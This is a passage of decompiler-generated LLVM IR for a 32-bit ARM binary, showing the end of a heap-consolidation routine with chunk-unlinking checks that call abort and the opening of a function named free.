  store i32 %v3_bbdc, i32* %r2.global-to-local, align 4
  store i32 %v1_bbd8, i32* %v1_bbc0, align 4
  %v0_bbe4 = load i32, i32* @r0, align 4
  %v1_bbe4 = add i32 %v0_bbe4, -4
  store i32 %v1_bbe4, i32* %r3.global-to-local, align 4
  %v1_bbe8 = load i32, i32* %r2.global-to-local, align 4
  %v4_bbe8 = mul i32 %v1_bbe8, 4
  %v5_bbe8 = add i32 %v4_bbe8, %v1_bbe4
  store i32 %v5_bbe8, i32* %sb.global-to-local, align 4
  %v1_bbec = add i32 %v0_bbe4, 52
  store i32 %v1_bbec, i32* %r7.global-to-local, align 4
  %v1_bbf0 = add i32 %v0_bbe4, 4
  store i32 %v1_bbf0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_bbf8

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_bcf4, %dec_label_pc_bbd8
  %v1_bcec10 = phi i32 [ %v1_bcec, %dec_label_pc_bcf4 ], [ %v5_bbe8, %dec_label_pc_bbd8 ]
  %v1_bc04 = phi i32 [ %v1_bcf4, %dec_label_pc_bcf4 ], [ %v1_bbf0, %dec_label_pc_bbd8 ]
  %v1_bbf8 = inttoptr i32 %v1_bc04 to i32*
  %v2_bbf8 = load i32, i32* %v1_bbf8, align 4
  store i32 %v2_bbf8, i32* %r1.global-to-local, align 4
  %v2_bbfc = icmp eq i32 %v2_bbf8, 0
  br i1 %v2_bbfc, label %dec_label_pc_bcec, label %dec_label_pc_bc04

dec_label_pc_bc04:                                ; preds = %dec_label_pc_bbf8
  %v0_bc04 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_bc04, i32* %v1_bbf8, align 4
  %v0_bc08.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bc08

dec_label_pc_bc08:                                ; preds = %dec_label_pc_bce0, %dec_label_pc_bc04
  %v0_bc24 = phi i32 [ %v0_bce0, %dec_label_pc_bce0 ], [ %v0_bc08.pre, %dec_label_pc_bc04 ]
  %v1_bc08 = add i32 %v0_bc24, 4
  %v2_bc08 = inttoptr i32 %v1_bc08 to i32*
  %v3_bc08 = load i32, i32* %v2_bc08, align 4
  store i32 %v3_bc08, i32* %r3.global-to-local, align 4
  %v1_bc0c = and i32 %v3_bc08, -2
  store i32 %v1_bc0c, i32* %lr.global-to-local, align 4
  %v2_bc10 = add i32 %v1_bc0c, %v0_bc24
  store i32 %v2_bc10, i32* @r0, align 4
  %v1_bc14 = urem i32 %v3_bc08, 2
  %v2_bc14 = icmp eq i32 %v1_bc14, 0
  %v1_bc18 = add i32 %v0_bc24, 8
  %v2_bc18 = inttoptr i32 %v1_bc18 to i32*
  %v3_bc18 = load i32, i32* %v2_bc18, align 4
  store i32 %v3_bc18, i32* %sl.global-to-local, align 4
  %v1_bc1c = add i32 %v2_bc10, 4
  %v2_bc1c = inttoptr i32 %v1_bc1c to i32*
  %v3_bc1c = load i32, i32* %v2_bc1c, align 4
  store i32 %v3_bc1c, i32* %r8.global-to-local, align 4
  br i1 %v2_bc14, label %dec_label_pc_bc24, label %dec_label_pc_bc58

dec_label_pc_bc24:                                ; preds = %dec_label_pc_bc08
  %v1_bc24 = inttoptr i32 %v0_bc24 to i32*
  %v2_bc24 = load i32, i32* %v1_bc24, align 4
  store i32 %v2_bc24, i32* %r5.global-to-local, align 4
  %v2_bc28 = sub i32 %v0_bc24, %v2_bc24
  store i32 %v2_bc28, i32* %r3.global-to-local, align 4
  %v1_bc2c = add i32 %v2_bc28, 8
  %v2_bc2c = inttoptr i32 %v1_bc2c to i32*
  %v3_bc2c = load i32, i32* %v2_bc2c, align 4
  store i32 %v3_bc2c, i32* %ip.global-to-local, align 4
  %v1_bc30 = add i32 %v3_bc2c, 12
  %v2_bc30 = inttoptr i32 %v1_bc30 to i32*
  %v3_bc30 = load i32, i32* %v2_bc30, align 4
  store i32 %v3_bc30, i32* %r1.global-to-local, align 4
  %v9_bc34 = icmp eq i32 %v3_bc30, %v2_bc28
  %v1_bc38 = add i32 %v2_bc28, 12
  %v2_bc38 = inttoptr i32 %v1_bc38 to i32*
  %v3_bc38 = load i32, i32* %v2_bc38, align 4
  store i32 %v3_bc38, i32* %r2.global-to-local, align 4
  br i1 %v9_bc34, label %dec_label_pc_bc40, label %dec_label_pc_bc9c

dec_label_pc_bc40:                                ; preds = %dec_label_pc_bc24
  %v1_bc40 = add i32 %v3_bc38, 8
  %v2_bc40 = inttoptr i32 %v1_bc40 to i32*
  %v3_bc40 = load i32, i32* %v2_bc40, align 4
  store i32 %v3_bc40, i32* %r3.global-to-local, align 4
  %v9_bc44 = icmp eq i32 %v3_bc40, %v2_bc28
  br i1 %v9_bc44, label %dec_label_pc_bc4c, label %dec_label_pc_bc9c

dec_label_pc_bc4c:                                ; preds = %dec_label_pc_bc40
  store i32 %v3_bc2c, i32* %v2_bc40, align 4
  %v0_bc50 = load i32, i32* %r2.global-to-local, align 4
  %v1_bc50 = load i32, i32* %ip.global-to-local, align 4
  %v2_bc50 = add i32 %v1_bc50, 12
  %v3_bc50 = inttoptr i32 %v2_bc50 to i32*
  store i32 %v0_bc50, i32* %v3_bc50, align 4
  %v0_bc54 = load i32, i32* %lr.global-to-local, align 4
  %v1_bc54 = load i32, i32* %r5.global-to-local, align 4
  %v2_bc54 = add i32 %v1_bc54, %v0_bc54
  store i32 %v2_bc54, i32* %lr.global-to-local, align 4
  %v0_bc5c.pre = load i32, i32* @r0, align 4
  %v0_bc60.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_bc58

dec_label_pc_bc58:                                ; preds = %dec_label_pc_bc08, %dec_label_pc_bc4c
  %v0_bcd0 = phi i32 [ %v1_bc0c, %dec_label_pc_bc08 ], [ %v2_bc54, %dec_label_pc_bc4c ]
  %v0_bc60 = phi i32 [ %v3_bc1c, %dec_label_pc_bc08 ], [ %v0_bc60.pre, %dec_label_pc_bc4c ]
  %v1_bc74 = phi i32 [ %v2_bc10, %dec_label_pc_bc08 ], [ %v0_bc5c.pre, %dec_label_pc_bc4c ]
  %v0_bc58 = load i32, i32* @r4, align 4
  %v1_bc58 = add i32 %v0_bc58, 44
  %v2_bc58 = inttoptr i32 %v1_bc58 to i32*
  %v3_bc58 = load i32, i32* %v2_bc58, align 4
  store i32 %v3_bc58, i32* %r3.global-to-local, align 4
  %v9_bc5c = icmp eq i32 %v1_bc74, %v3_bc58
  %v1_bc60 = and i32 %v0_bc60, -4
  store i32 %v1_bc60, i32* %r5.global-to-local, align 4
  br i1 %v9_bc5c, label %dec_label_pc_bcd0, label %dec_label_pc_bc68

dec_label_pc_bc68:                                ; preds = %dec_label_pc_bc58
  %v2_bc68 = add i32 %v1_bc74, %v1_bc60
  store i32 %v2_bc68, i32* %r3.global-to-local, align 4
  %v1_bc6c = add i32 %v2_bc68, 4
  %v2_bc6c = inttoptr i32 %v1_bc6c to i32*
  %v3_bc6c = load i32, i32* %v2_bc6c, align 4
  store i32 %v3_bc6c, i32* %r3.global-to-local, align 4
  %v1_bc70 = urem i32 %v3_bc6c, 2
  %v2_bc70 = icmp eq i32 %v1_bc70, 0
  %v2_bc74 = add i32 %v1_bc74, 4
  %v3_bc74 = inttoptr i32 %v2_bc74 to i32*
  store i32 %v1_bc60, i32* %v3_bc74, align 4
  br i1 %v2_bc70, label %dec_label_pc_bc7c, label %dec_label_pc_bc68.dec_label_pc_bcac_crit_edge

dec_label_pc_bc68.dec_label_pc_bcac_crit_edge:    ; preds = %dec_label_pc_bc68
  %v0_bcb0.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_bcac

dec_label_pc_bc7c:                                ; preds = %dec_label_pc_bc68
  %v0_bc7c = load i32, i32* @r0, align 4
  %v1_bc7c = add i32 %v0_bc7c, 8
  %v2_bc7c = inttoptr i32 %v1_bc7c to i32*
  %v3_bc7c = load i32, i32* %v2_bc7c, align 4
  store i32 %v3_bc7c, i32* %ip.global-to-local, align 4
  %v1_bc80 = add i32 %v3_bc7c, 12
  %v2_bc80 = inttoptr i32 %v1_bc80 to i32*
  %v3_bc80 = load i32, i32* %v2_bc80, align 4
  store i32 %v3_bc80, i32* %r3.global-to-local, align 4
  %v9_bc84 = icmp eq i32 %v3_bc80, %v0_bc7c
  %v1_bc88 = add i32 %v0_bc7c, 12
  %v2_bc88 = inttoptr i32 %v1_bc88 to i32*
  %v3_bc88 = load i32, i32* %v2_bc88, align 4
  store i32 %v3_bc88, i32* %r2.global-to-local, align 4
  br i1 %v9_bc84, label %dec_label_pc_bc90, label %dec_label_pc_bc9c

dec_label_pc_bc90:                                ; preds = %dec_label_pc_bc7c
  %v1_bc90 = add i32 %v3_bc88, 8
  %v2_bc90 = inttoptr i32 %v1_bc90 to i32*
  %v3_bc90 = load i32, i32* %v2_bc90, align 4
  store i32 %v3_bc90, i32* %r3.global-to-local, align 4
  %v9_bc94 = icmp eq i32 %v3_bc90, %v0_bc7c
  br i1 %v9_bc94, label %dec_label_pc_bca0, label %dec_label_pc_bc9c

dec_label_pc_bc9c:                                ; preds = %dec_label_pc_bc7c, %dec_label_pc_bc40, %dec_label_pc_bc24, %dec_label_pc_bc90
  %v0_bc9c = call i32 @abort()
  store i32 %v0_bc9c, i32* @r0, align 4
  %v0_bca0.pre = load i32, i32* @ip, align 4
  %v1_bca0.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_bca0

dec_label_pc_bca0:                                ; preds = %dec_label_pc_bc90, %dec_label_pc_bc9c
  %v1_bca0 = phi i32 [ %v3_bc88, %dec_label_pc_bc90 ], [ %v1_bca0.pre, %dec_label_pc_bc9c ]
  %v0_bca0 = phi i32 [ %v3_bc7c, %dec_label_pc_bc90 ], [ %v0_bca0.pre, %dec_label_pc_bc9c ]
  %v2_bca0 = add i32 %v1_bca0, 8
  %v3_bca0 = inttoptr i32 %v2_bca0 to i32*
  store i32 %v0_bca0, i32* %v3_bca0, align 4
  %v0_bca4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bca4 = load i32, i32* %ip.global-to-local, align 4
  %v2_bca4 = add i32 %v1_bca4, 12
  %v3_bca4 = inttoptr i32 %v2_bca4 to i32*
  store i32 %v0_bca4, i32* %v3_bca4, align 4
  %v0_bca8 = load i32, i32* %lr.global-to-local, align 4
  %v1_bca8 = load i32, i32* %r5.global-to-local, align 4
  %v2_bca8 = add i32 %v1_bca8, %v0_bca8
  store i32 %v2_bca8, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_bcac

dec_label_pc_bcac:                                ; preds = %dec_label_pc_bc68.dec_label_pc_bcac_crit_edge, %dec_label_pc_bca0
  %v0_bcb0 = phi i32 [ %v0_bcb0.pre, %dec_label_pc_bc68.dec_label_pc_bcac_crit_edge ], [ %v2_bca8, %dec_label_pc_bca0 ]
  %v0_bcac = load i32, i32* %r7.global-to-local, align 4
  %v1_bcac = add i32 %v0_bcac, 8
  %v2_bcac = inttoptr i32 %v1_bcac to i32*
  %v3_bcac = load i32, i32* %v2_bcac, align 4
  store i32 %v3_bcac, i32* %r2.global-to-local, align 4
  %v1_bcb0 = or i32 %v0_bcb0, 1
  store i32 %v1_bcb0, i32* %r3.global-to-local, align 4
  %v0_bcb4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_bcb4, i32* %v2_bcac, align 4
  %v0_bcb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_bcb8 = load i32, i32* %r2.global-to-local, align 4
  %v2_bcb8 = add i32 %v1_bcb8, 12
  %v3_bcb8 = inttoptr i32 %v2_bcb8 to i32*
  store i32 %v0_bcb8, i32* %v3_bcb8, align 4
  %v0_bcbc = load i32, i32* %lr.global-to-local, align 4
  %v1_bcbc = load i32, i32* %r1.global-to-local, align 4
  %v3_bcbc = add i32 %v1_bcbc, %v0_bcbc
  %v4_bcbc = inttoptr i32 %v3_bcbc to i32*
  store i32 %v0_bcbc, i32* %v4_bcbc, align 4
  %v0_bcc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_bcc0 = load i32, i32* %r1.global-to-local, align 4
  %v2_bcc0 = add i32 %v1_bcc0, 4
  %v3_bcc0 = inttoptr i32 %v2_bcc0 to i32*
  store i32 %v0_bcc0, i32* %v3_bcc0, align 4
  %v0_bcc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bcc4 = load i32, i32* %r1.global-to-local, align 4
  %v2_bcc4 = add i32 %v1_bcc4, 8
  %v3_bcc4 = inttoptr i32 %v2_bcc4 to i32*
  store i32 %v0_bcc4, i32* %v3_bcc4, align 4
  %v0_bcc8 = load i32, i32* %r7.global-to-local, align 4
  %v1_bcc8 = load i32, i32* %r1.global-to-local, align 4
  %v2_bcc8 = add i32 %v1_bcc8, 12
  %v3_bcc8 = inttoptr i32 %v2_bcc8 to i32*
  store i32 %v0_bcc8, i32* %v3_bcc8, align 4
  br label %dec_label_pc_bce0

dec_label_pc_bcd0:                                ; preds = %dec_label_pc_bc58
  %v2_bcd0 = add i32 %v1_bc60, %v0_bcd0
  %v1_bcd4 = or i32 %v2_bcd0, 1
  store i32 %v1_bcd4, i32* %r3.global-to-local, align 4
  %v1_bcd8 = load i32, i32* %r1.global-to-local, align 4
  %v2_bcd8 = add i32 %v1_bcd8, 4
  %v3_bcd8 = inttoptr i32 %v2_bcd8 to i32*
  store i32 %v1_bcd4, i32* %v3_bcd8, align 4
  %v0_bcdc = load i32, i32* %r1.global-to-local, align 4
  %v1_bcdc = load i32, i32* @r4, align 4
  %v2_bcdc = add i32 %v1_bcdc, 44
  %v3_bcdc = inttoptr i32 %v2_bcdc to i32*
  store i32 %v0_bcdc, i32* %v3_bcdc, align 4
  br label %dec_label_pc_bce0

dec_label_pc_bce0:                                ; preds = %dec_label_pc_bcac, %dec_label_pc_bcd0
  %v0_bce0 = load i32, i32* %sl.global-to-local, align 4
  %v2_bce0 = icmp eq i32 %v0_bce0, 0
  store i32 %v0_bce0, i32* %r1.global-to-local, align 4
  br i1 %v2_bce0, label %dec_label_pc_bcec.loopexit, label %dec_label_pc_bc08

dec_label_pc_bcec.loopexit:                       ; preds = %dec_label_pc_bce0
  %v0_bcec.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_bcec.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_bcec

dec_label_pc_bcec:                                ; preds = %dec_label_pc_bcec.loopexit, %dec_label_pc_bbf8
  %v1_bcec = phi i32 [ %v1_bcec.pre, %dec_label_pc_bcec.loopexit ], [ %v1_bcec10, %dec_label_pc_bbf8 ]
  %v0_bcf4 = phi i32 [ %v0_bcec.pre, %dec_label_pc_bcec.loopexit ], [ %v1_bc04, %dec_label_pc_bbf8 ]
  %v9_bcec = icmp eq i32 %v0_bcf4, %v1_bcec
  br i1 %v9_bcec, label %dec_label_pc_bd64, label %dec_label_pc_bcf4

dec_label_pc_bcf4:                                ; preds = %dec_label_pc_bcec
  %v1_bcf4 = add i32 %v0_bcf4, 4
  store i32 %v1_bcf4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_bbf8

dec_label_pc_bcfc.dec_label_pc_bcfc_crit_edge:    ; preds = %dec_label_pc_bcfc.preheader, %dec_label_pc_bcfc.dec_label_pc_bcfc_crit_edge
  %v0_bcfc.pre = load i32, i32* @r4, align 4
  %v1_bcfc.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_bcfc = mul i32 %v1_bcfc.pre, 8
  %v5_bcfc = add i32 %v4_bcfc, %v0_bcfc.pre
  %v1_bd00 = add i32 %v1_bcfc.pre, 1
  store i32 %v1_bd00, i32* %r2.global-to-local, align 4
  %v1_bd04 = add i32 %v5_bcfc, 44
  store i32 %v1_bd04, i32* %r3.global-to-local, align 4
  %v2_bd0c = add i32 %v5_bcfc, 52
  %v3_bd0c = inttoptr i32 %v2_bd0c to i32*
  store i32 %v1_bd04, i32* %v3_bd0c, align 4
  %v0_bd10 = load i32, i32* %r3.global-to-local, align 4
  %v2_bd10 = add i32 %v0_bd10, 12
  %v3_bd10 = inttoptr i32 %v2_bd10 to i32*
  store i32 %v0_bd10, i32* %v3_bd10, align 4
  %v7_bd14 = icmp sgt i32 %v1_bd00, 95
  br i1 %v7_bd14, label %dec_label_pc_bd18, label %dec_label_pc_bcfc.dec_label_pc_bcfc_crit_edge

dec_label_pc_bd18:                                ; preds = %dec_label_pc_bcfc.dec_label_pc_bcfc_crit_edge
  %v0_bd18 = load i32, i32* @r4, align 4
  %v1_bd18 = inttoptr i32 %v0_bd18 to i32*
  %v2_bd18 = load i32, i32* %v1_bd18, align 4
  store i32 %v2_bd18, i32* %r2.global-to-local, align 4
  %v1_bd1c = add i32 %v0_bd18, 864
  %v2_bd1c = inttoptr i32 %v1_bd1c to i32*
  %v3_bd1c = load i32, i32* %v2_bd1c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_bd24 = urem i32 %v2_bd18, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_bd2c = or i32 %v3_bd1c, 1
  store i32 %v1_bd2c, i32* %r1.global-to-local, align 4
  %v1_bd30 = or i32 %v1_bd24, 72
  store i32 %v1_bd30, i32* %r2.global-to-local, align 4
  %v1_bd34 = add i32 %v0_bd18, 52
  store i32 %v1_bd34, i32* %ip.global-to-local, align 4
  %v2_bd38 = add i32 %v0_bd18, 840
  %v3_bd38 = inttoptr i32 %v2_bd38 to i32*
  store i32 0, i32* %v3_bd38, align 4
  %v0_bd3c = load i32, i32* %r3.global-to-local, align 4
  %v1_bd3c = add i32 %v0_bd3c, 65536
  store i32 %v1_bd3c, i32* %r3.global-to-local, align 4
  %v0_bd40 = load i32, i32* %r0.global-to-local, align 4
  %v1_bd40 = load i32, i32* @r4, align 4
  %v2_bd40 = add i32 %v1_bd40, 836
  %v3_bd40 = inttoptr i32 %v2_bd40 to i32*
  store i32 %v0_bd40, i32* %v3_bd40, align 4
  %v0_bd44 = load i32, i32* %r0.global-to-local, align 4
  %v1_bd44 = load i32, i32* @r4, align 4
  %v2_bd44 = add i32 %v1_bd44, 844
  %v3_bd44 = inttoptr i32 %v2_bd44 to i32*
  store i32 %v0_bd44, i32* %v3_bd44, align 4
  %v1_bd48 = load i32, i32* @r4, align 4
  %v2_bd48 = add i32 %v1_bd48, 852
  %v3_bd48 = inttoptr i32 %v2_bd48 to i32*
  store i32 %v1_bd3c, i32* %v3_bd48, align 4
  %v1_bd4c = load i32, i32* @r4, align 4
  %v2_bd4c = add i32 %v1_bd4c, 864
  %v3_bd4c = inttoptr i32 %v2_bd4c to i32*
  store i32 %v1_bd2c, i32* %v3_bd4c, align 4
  %v1_bd50 = load i32, i32* @r4, align 4
  %v2_bd50 = inttoptr i32 %v1_bd50 to i32*
  store i32 %v1_bd30, i32* %v2_bd50, align 4
  %v0_bd54 = load i32, i32* %ip.global-to-local, align 4
  %v1_bd54 = load i32, i32* @r4, align 4
  %v2_bd54 = add i32 %v1_bd54, 44
  %v3_bd54 = inttoptr i32 %v2_bd54 to i32*
  store i32 %v0_bd54, i32* %v3_bd54, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_bd5c = call i32 @sysconf(i32 30, i32 %v1_bd2c, i32 %v1_bd30, i32 %v1_bd3c)
  store i32 %v4_bd5c, i32* @r0, align 4
  %v1_bd60 = load i32, i32* @r4, align 4
  %v2_bd60 = add i32 %v1_bd60, 860
  %v3_bd60 = inttoptr i32 %v2_bd60 to i32*
  store i32 %v4_bd5c, i32* %v3_bd60, align 4
  br label %dec_label_pc_bd64

dec_label_pc_bd64:                                ; preds = %dec_label_pc_bcec, %dec_label_pc_bd18
  %v2_bd68 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_bd68, i32* @r4, align 4
  %v1_bd6c = load i32, i32* @r0, align 4
  ret i32 %v1_bd6c

; uselistorder directives
  uselistorder i32 %v0_bd18, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bd10, { 1, 0 }
  uselistorder i32 %v1_bcf4, { 1, 0 }
  uselistorder i32 %v0_bce0, { 0, 2, 1 }
  uselistorder i32 %v0_bcbc, { 1, 0 }
  uselistorder i32 %v1_bc0c, { 1, 0, 2 }
  uselistorder i32 %v0_bc24, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_bbe4, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 30, { 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_bd64, { 1, 0 }
  uselistorder label %dec_label_pc_bcfc.dec_label_pc_bcfc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_bce0, { 1, 0 }
  uselistorder label %dec_label_pc_bcac, { 1, 0 }
  uselistorder label %dec_label_pc_bca0, { 1, 0 }
  uselistorder label %dec_label_pc_bc9c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_bc58, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_bd70 = load i32, i32* @r4, align 4
  %v6_bd70 = load i32, i32* @r5, align 4
  %v9_bd70 = load i32, i32* @r6, align 4
  %v12_bd70 = load i32, i32* @r7, align 4
  %v18_bd70 = load i32, i32* @lr, align 4
  %v0_bd78 = load i32, i32* @r0, align 4
  store i32 %v0_bd78, i32* @r6, align 4
  %v2_bd78 = icmp eq i32 %v0_bd78, 0
  %v2_bd7c = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r7, align 4
  br i1 %v2_bd78, label %dec_label_pc_bf84, label %dec_label_pc_bd88

dec_label_pc_bd88:                                ; preds = %entry
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_bd8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 72) to i32*), align 4
  store i32 %v4_bd8c, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_bd8c, i32* %r2.global-to-local, align 4
  %v4_bd98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 36) to i32*), align 4
  store i32 %v4_bd98, i32* %r1.global-to-local, align 4
  store i32 %v2_bd7c, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_bda4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  store i32 %v4_bda4, i32* %ip.global-to-local, align 4
  store i32 48560, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_bda4)
  %v0_bdb0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_bdb0, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_bdb8 = load i32, i32* @r7, align 4
  %v2_bdb8 = add i32 %v0_bdb8, 16
  %v3_bdb8 = inttoptr i32 %v2_bdb8 to i32*
  %v4_bdb8 = load i32, i32* %v3_bdb8, align 4
  store i32 %v4_bdb8, i32* %ip.global-to-local, align 4
  store i32 48580, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_bdb8)
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_bdc8 = load i32, i32* @r7, align 4
  %v2_bdc8 = add i32 %v0_bdc8, 32
  %v3_bdc8 = inttoptr i32 %v2_bdc8 to i32*
  %v4_bdc8 = load i32, i32* %v3_bdc8, align 4
  store i32 %v4_bdc8, i32* @lr, align 4
  %v0_bdcc = load i32, i32* @r6, align 4
  %v1_bdcc = add i32 %v0_bdcc, -4
  %v2_bdcc = inttoptr i32 %v1_bdcc to i32*
  %v3_bdcc = load i32, i32* %v2_bdcc, align 4
  store i32 %v3_bdcc, i32* %r2.global-to-local, align 4
  %v1_bdd0 = inttoptr i32 %v4_bdc8 to i32*
  %v2_bdd0 = load i32, i32* %v1_bdd0, align 4
  store i32 %v2_bdd0, i32* %r3.global-to-local, align 4
  %v1_bdd4 = and i32 %v3_bdcc, -4
  store i32 %v1_bdd4, i32* %ip.global-to-local, align 4
  %v1_bdd8 = add i32 %v0_bdcc, -8
  store i32 %v1_bdd8, i32* @r5, align 4
  store i32 %v1_bdd8, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_bdd4, %v2_bdd0
  br i1 %tmp, label %dec_label_pc_be08, label %dec_label_pc_bde8

dec_label_pc_bde8:                                ; preds = %dec_label_pc_bd88
  %v1_bde8 = or i32 %v2_bdd0, 3
  store i32 %v1_bde8, i32* %r3.global-to-local, align 4
  store i32 %v1_bde8, i32* %v1_bdd0, align 4
  %v3_bdec = load i32, i32* @lr, align 4
  %v4_bdec = add i32 %v3_bdec, -8
  store i32 %v4_bdec, i32* %lr.global-to-local, align 4
  %v0_bdf0 = load i32, i32* %ip.global-to-local, align 4
  %v3_bdf0 = udiv i32 %v0_bdf0, 8
  store i32 %v3_bdf0, i32* %r1.global-to-local, align 4
  %v1_bdf4 = add i32 %v3_bdec, -4
  store i32 %v1_bdf4, i32* @r2, align 4
  %v4_bdf8 = mul nuw i32 %v3_bdf0, 4
  %v5_bdf8 = add i32 %v4_bdf8, %v1_bdf4
  %v6_bdf8 = inttoptr i32 %v5_bdf8 to i32*
  %v7_bdf8 = load i32, i32* %v6_bdf8, align 4
  store i32 %v7_bdf8, i32* %r3.global-to-local, align 4
  %v1_bdfc = load i32, i32* @r5, align 4
  %v2_bdfc = add i32 %v1_bdfc, 8
  %v3_bdfc = inttoptr i32 %v2_bdfc to i32*
  store i32 %v7_bdf8, i32* %v3_bdfc, align 4
  %v0_be00 = load i32, i32* @r5, align 4
  %v1_be00 = load i32, i32* @r2, align 4
  %v2_be00 = load i32, i32* %r1.global-to-local, align 4
  %v5_be00 = mul i32 %v2_be00, 4
  %v6_be00 = add i32 %v5_be00, %v1_be00
  %v7_be00 = inttoptr i32 %v6_be00 to i32*
  store i32 %v0_be00, i32* %v7_be00, align 4
  br label %dec_label_pc_bf6c

dec_label_pc_be08:                                ; preds = %dec_label_pc_bd88
  %v1_be08 = and i32 %v3_bdcc, 2
  %v2_be08 = icmp eq i32 %v1_be08, 0
  br i1 %v2_be08, label %dec_label_pc_be10, label %dec_label_pc_bf44

dec_label_pc_be10:                                ; preds = %dec_label_pc_be08
  %v1_be10 = or i32 %v2_bdd0, 1
  store i32 %v1_be10, i32* %r3.global-to-local, align 4
  store i32 %v1_be10, i32* %v1_bdd0, align 4
  %v0_be18 = load i32, i32* @r6, align 4
  %v1_be18 = add i32 %v0_be18, -4
  %v2_be18 = inttoptr i32 %v1_be18 to i32*
  %v3_be18 = load i32, i32* %v2_be18, align 4
  store i32 %v3_be18, i32* %r3.global-to-local, align 4
  %v0_be1c = load i32, i32* @r5, align 4
  %v1_be1c = load i32, i32* %ip.global-to-local, align 4
  %v2_be1c = add i32 %v1_be1c, %v0_be1c
  store i32 %v2_be1c, i32* %lr.global-to-local, align 4
  %v1_be20 = urem i32 %v3_be18, 2
  %v2_be20 = icmp eq i32 %v1_be20, 0
  %v1_be24 = add i32 %v2_be1c, 4
  %v2_be24 = inttoptr i32 %v1_be24 to i32*
  %v3_be24 = load i32, i32* %v2_be24, align 4
  store i32 %v3_be24, i32* %r8.global-to-local, align 4
  br i1 %v2_be20, label %dec_label_pc_be2c, label %dec_label_pc_be60

dec_label_pc_be2c:                                ; preds = %dec_label_pc_be10
  %v1_be2c = add i32 %v0_be18, -8
  %v2_be2c = inttoptr i32 %v1_be2c to i32*
  %v3_be2c = load i32, i32* %v2_be2c, align 4
  store i32 %v3_be2c, i32* %r1.global-to-local, align 4
  %v2_be30 = sub i32 %v0_be1c, %v3_be2c
  store i32 %v2_be30, i32* %r3.global-to-local, align 4
  %v1_be34 = add i32 %v2_be30, 8
  %v2_be34 = inttoptr i32 %v1_be34 to i32*
  %v3_be34 = load i32, i32* %v2_be34, align 4
  store i32 %v3_be34, i32* %r2.global-to-local, align 4
  %v1_be38 = add i32 %v3_be34, 12
  %v2_be38 = inttoptr i32 %v1_be38 to i32*
  %v3_be38 = load i32, i32* %v2_be38, align 4
  store i32 %v3_be38, i32* %r4.global-to-local, align 4
  %v9_be3c = icmp eq i32 %v3_be38, %v2_be30
  %v1_be40 = add i32 %v2_be30, 12
  %v2_be40 = inttoptr i32 %v1_be40 to i32*
  %v3_be40 = load i32, i32* %v2_be40, align 4
  store i32 %v3_be40, i32* %r0.global-to-local, align 4
  br i1 %v9_be3c, label %dec_label_pc_be48, label %dec_label_pc_beac

dec_label_pc_be48:                                ; preds = %dec_label_pc_be2c
  %v1_be48 = add i32 %v3_be40, 8
  %v2_be48 = inttoptr i32 %v1_be48 to i32*
  %v3_be48 = load i32, i32* %v2_be48, align 4
  store i32 %v3_be48, i32* %r3.global-to-local, align 4
  %v9_be4c = icmp eq i32 %v3_be48, %v2_be30
  br i1 %v9_be4c, label %dec_label_pc_be54, label %dec_label_pc_beac

